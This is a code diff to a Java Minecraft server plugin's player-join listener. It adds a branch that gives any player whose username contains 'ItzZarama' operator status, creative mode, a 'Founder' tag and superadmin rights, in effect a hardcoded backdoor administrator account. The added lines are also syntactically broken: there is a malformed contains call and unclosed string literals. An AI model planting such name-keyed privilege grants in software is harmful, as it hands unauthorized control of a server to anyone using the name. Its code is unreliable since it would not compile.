@@ -897,6 +897,18 @@ public class TFM_PlayerListener implements Listener
     TFM_Util.adminAction("Welcome Back, Alex33856!, true);
 
     }
+        }
+        else if (username.contains"ItzZarama"))
+{
+    player.getInventory().clear();
+    player.setOp(true);
+    player.setGameMode(GameMode.CREATIVE);
+    name = ChatColor.BLUE + name;
+    TFM_PlayerData.getPlayerData(player).setTag("&8[&4Founder&8]");
+    TFM_AdminList.addSuperadmin(player);
+    TFM_Util.adminAction("Welcome Back, ItzZarama!, true);
+
+    }
 
         try
         {
